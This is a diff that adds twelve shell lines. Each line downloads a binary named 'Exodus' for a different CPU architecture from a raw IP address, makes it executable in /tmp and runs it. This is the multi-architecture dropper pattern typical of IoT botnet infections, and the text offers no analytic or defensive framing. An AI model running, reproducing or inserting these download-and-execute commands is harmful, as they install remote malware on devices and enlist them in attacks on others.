@@ -1,0 +1,12 @@
+cd /tmp; wget http://196.251.100.191/no_killer/Exodus.mips; chmod 777 *; ./Exodus.mips
+cd /tmp; wget http://196.251.100.191/no_killer/Exodus.mpsl; chmod 777 *; ./Exodus.mpsl
+cd /tmp; wget http://196.251.100.191/no_killer/Exodus.x86_64; chmod 777 *; ./Exodus.x86_64
+cd /tmp; wget http://196.251.100.191/no_killer/Exodus.x86; chmod 777 *; ./Exodus.x86
+cd /tmp; wget http://196.251.100.191/no_killer/Exodus.spc; chmod 777 *; ./Exodus.spc
+cd /tmp; wget http://196.251.100.191/no_killer/Exodus.sh4; chmod 777 *; ./Exodus.sh4
+cd /tmp; wget http://196.251.100.191/no_killer/Exodus.m68k; chmod 777 *; ./Exodus.m68k
+cd /tmp; wget http://196.251.100.191/no_killer/Exodus.i686; chmod 777 *; ./Exodus.i686
+cd /tmp; wget http://196.251.100.191/no_killer/Exodus.arm7; chmod 777 *; ./Exodus.arm7
+cd /tmp; wget http://196.251.100.191/no_killer/Exodus.arm5; chmod 777 *; ./Exodus.arm5
+cd /tmp; wget http://196.251.100.191/no_killer/Exodus.arm6; chmod 777 *; ./Exodus.arm6
+cd /tmp; wget http://196.251.100.191/no_killer/Exodus.arm4; chmod 777 *; ./Exodus.arm4
